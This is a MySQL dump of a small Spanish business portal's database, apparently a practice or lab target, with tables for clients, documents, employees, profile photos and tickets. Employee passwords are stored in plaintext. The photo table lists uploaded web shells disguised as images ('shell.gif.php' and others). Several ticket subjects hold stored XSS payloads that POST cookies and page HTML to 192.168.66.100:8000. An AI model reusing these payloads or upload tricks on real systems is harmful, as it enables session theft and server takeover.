-- MySQL dump 10.13  Distrib 8.0.45, for Linux (x86_64)
--
-- Host: localhost    Database: portal_pyme
-- ------------------------------------------------------
-- Server version	8.0.45-0ubuntu0.22.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `clientes`
--

DROP TABLE IF EXISTS `clientes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `clientes` (
  `id` int NOT NULL AUTO_INCREMENT,
  `empresa` varchar(120) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nombre` varchar(120) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(120) COLLATE utf8mb4_unicode_ci NOT NULL,
  `telefono` varchar(40) COLLATE utf8mb4_unicode_ci NOT NULL,
  `owner_id` int NOT NULL,
  `notas` text COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`id`),
  KEY `owner_id` (`owner_id`),
  CONSTRAINT `clientes_ibfk_1` FOREIGN KEY (`owner_id`) REFERENCES `empleados` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `clientes`
--

LOCK TABLES `clientes` WRITE;
/*!40000 ALTER TABLE `clientes` DISABLE KEYS */;
INSERT INTO `clientes` VALUES (1,'Norte Digital SL','Ana Ruiz','ana.ruiz@nortedigital.local','+34 600 111 001',3,'Cliente asignado a jtorre. Renovación prevista en mayo.'),(2,'Logistica Campo SA','Carlos Medina','c.medina@logcampo.local','+34 600 111 002',3,'Incidencia recurrente con acceso VPN. Revisar ticket TCK-2026-002.'),(3,'Clinica Alameda','Laura Perez','laura.perez@alameda.local','+34 600 111 003',4,'Cliente gestionado por mgarcia. No compartir datos comerciales.'),(4,'Talleres Rivas','Miguel Rivas','miguel@talleresrivas.local','+34 600 111 004',4,'Nota interna: pidió reset de contraseña del portal antiguo.'),(5,'Grupo Lince','Sergio Martin','sergio.martin@grupolince.local','+34 600 111 005',2,'Cliente prioritario. Contactar solo desde soporte.'),(6,'Backup Services Iberia','Elena Casas','elena@backupiberia.local','+34 600 111 006',1,'Cuenta sensible. Revisar documentación histórica de backups.');
/*!40000 ALTER TABLE `clientes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `documentos`
--

DROP TABLE IF EXISTS `documentos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `documentos` (
  `id` int NOT NULL AUTO_INCREMENT,
  `nombre` varchar(160) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tipo` varchar(40) COLLATE utf8mb4_unicode_ci NOT NULL,
  `descripcion` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `ruta` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `documentos`
--

LOCK TABLES `documentos` WRITE;
/*!40000 ALTER TABLE `documentos` DISABLE KEYS */;
INSERT INTO `documentos` VALUES (1,'Manual de onboarding','TXT','Documento básico para nuevos empleados.','/portal_pyme/docs/manual_empleado.txt'),(2,'Política de contraseñas','TXT','Borrador pendiente de revisión por administración.','/portal_pyme/docs/manual-portal.txt'),(3,'Backup histórico','SQL','Copia parcial del portal antiguo. Pendiente de retirada.','/portal_pyme/docs/politica-privacidad.txt');
/*!40000 ALTER TABLE `documentos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `empleados`
--

DROP TABLE IF EXISTS `empleados`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `empleados` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(50) COLLATE utf8mb4_unicode_ci NOT NULL,
  `password` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(120) COLLATE utf8mb4_unicode_ci NOT NULL,
  `rol` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL,
  `departamento` varchar(80) COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `empleados`
--

LOCK TABLES `empleados` WRITE;
/*!40000 ALTER TABLE `empleados` DISABLE KEYS */;
INSERT INTO `empleados` VALUES (1,'system_admin','admin123','superadmin@portalpyme.local','admin','Direccion'),(2,'soporte','soporte123','soporte@portalpyme.local','empleado','Soporte'),(3,'jtorre','Invierno2026','j.torre@portalpyme.local','empleado','Comercial'),(4,'mgarcia','clientes2026','m.garcia@portalpyme.local','empleado','Comercial'),(5,'contabilidad','Conta2026!','contabilidad@portalpyme.local','empleado','Administracion'),(6,'juan','juan123','juan@portalpyme.local','empleado','Soporte');
/*!40000 ALTER TABLE `empleados` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `perfil_fotos`
--

DROP TABLE IF EXISTS `perfil_fotos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `perfil_fotos` (
  `id` int NOT NULL AUTO_INCREMENT,
  `empleado_id` int NOT NULL,
  `nombre_original` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `nombre_guardado` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `ruta_web` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `activa` tinyint(1) DEFAULT '1',
  `fecha_subida` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `empleado_id` (`empleado_id`),
  CONSTRAINT `perfil_fotos_ibfk_1` FOREIGN KEY (`empleado_id`) REFERENCES `empleados` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `perfil_fotos`
--

LOCK TABLES `perfil_fotos` WRITE;
/*!40000 ALTER TABLE `perfil_fotos` DISABLE KEYS */;
INSERT INTO `perfil_fotos` VALUES (1,6,'conejo_hacker.jpg','conejo_hacker.jpg','/portal_pyme/uploads/conejo_hacker.jpg',0,'2026-04-26 09:48:49'),(2,6,'conejo_hacker.jpg','conejo_hacker_1.jpg','/portal_pyme/uploads/conejo_hacker_1.jpg',0,'2026-04-26 10:09:05'),(3,6,'conejo_hacker.jpg','conejo_hacker_2.jpg','/portal_pyme/uploads/conejo_hacker_2.jpg',0,'2026-04-26 10:11:09'),(4,6,'conejo_hacker.jpg','conejo_hacker_3.jpg','/portal_pyme/uploads/conejo_hacker_3.jpg',0,'2026-04-26 10:12:56'),(5,6,'conejo_hacker.jpg','conejo_hacker_4.jpg','/portal_pyme/uploads/conejo_hacker_4.jpg',0,'2026-04-26 10:14:29'),(6,6,'conejo_hacker.jpg','conejo_hacker_5.jpg','/portal_pyme/uploads/conejo_hacker_5.jpg',0,'2026-04-26 10:15:27'),(7,6,'conejo_hacker.jpg','conejo_hacker.jpg','/portal_pyme/uploads/conejo_hacker.jpg',0,'2026-04-27 17:59:02'),(8,6,'terminal_url.gif.php','terminal_url.gif.php','/portal_pyme/uploads/terminal_url.gif.php',0,'2026-04-27 18:07:35'),(9,6,'shell.gif.php','shell.gif.php','/portal_pyme/uploads/shell.gif.php',0,'2026-04-27 18:10:05'),(10,6,'web_shell_bonita.gif.php','web_shell_bonita.gif.php','/portal_pyme/uploads/web_shell_bonita.gif.php',0,'2026-04-27 18:16:58'),(11,6,'file_browser.gif.php','file_browser.gif.php','/portal_pyme/uploads/file_browser.gif.php',1,'2026-04-27 18:20:23');
/*!40000 ALTER TABLE `perfil_fotos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `tickets`
--

DROP TABLE IF EXISTS `tickets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `tickets` (
  `id` int NOT NULL AUTO_INCREMENT,
  `codigo` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL,
  `asunto` varchar(160) COLLATE utf8mb4_unicode_ci NOT NULL,
  `descripcion` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `estado` varchar(40) COLLATE utf8mb4_unicode_ci NOT NULL,
  `prioridad` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL,
  `empleado_asignado` varchar(80) COLLATE utf8mb4_unicode_ci NOT NULL,
  `cliente_id` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo` (`codigo`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `tickets`
--

LOCK TABLES `tickets` WRITE;
/*!40000 ALTER TABLE `tickets` DISABLE KEYS */;
INSERT INTO `tickets` VALUES (1,'TCK-2026-001','Error al acceder al portal','El cliente indica error intermitente al acceder desde la oficina.','Abierto','Media','soporte',1),(2,'TCK-2026-002','VPN no conecta','Revisar configuración legacy. Posible conflicto con credenciales antiguas.','En revisión','Alta','jtorre',2),(3,'TCK-2026-003','Solicitud de factura','Cliente solicita duplicado de factura trimestral.','Cerrado','Baja','contabilidad',3),(4,'TCK-2026-004','Migración de backup','Pendiente mover backup fuera del DocumentRoot.','Abierto','Alta','superadmin',6),(5,'TCK-2026-005','Alta nuevo empleado','Crear usuario temporal para soporte de guardia.','En revisión','Media','soporte',5),(6,'INC-2026-26351','sdfsasdfasdfasdfasdfasdf','sdfsdfsdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf','Pendiente de clasificación','Sin asignar','Sin asignar',NULL),(7,'TCK-2026-60197','<img src=x onerror=alert(1)>','asdasdasdasdasdasdasd','Pendiente de clasificación','Sin asignar','Sin asignar',NULL),(8,'TCK-2026-99988','<img src=x onerror=\"fetch(`http://192.168.66.100:8000`,{method:`POST`,body:document.body.innerHTML})\">','adfsdfsasd fasd fg fghfgh cv','Pendiente de clasificación','Sin asignar','Sin asignar',NULL),(9,'TCK-2026-28019','<img src=x onerror=\"fetch(`http://192.168.66.100:8000`,{method:`POST`,body:document.cookie})\">','dasdfasdfdvasdvdsfasdva','Pendiente de clasificación','Sin asignar','Sin asignar',NULL),(10,'TCK-2026-32971','<img src=x onerror=\"fetch(`http://192.168.66.100:8000`,{method:`POST`,body:document.cookie})\">','asdfgasdfasdfds fasdf fa da df','Pendiente de clasificación','Sin asignar','Sin asignar',NULL);
/*!40000 ALTER TABLE `tickets` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2026-04-30 12:42:24
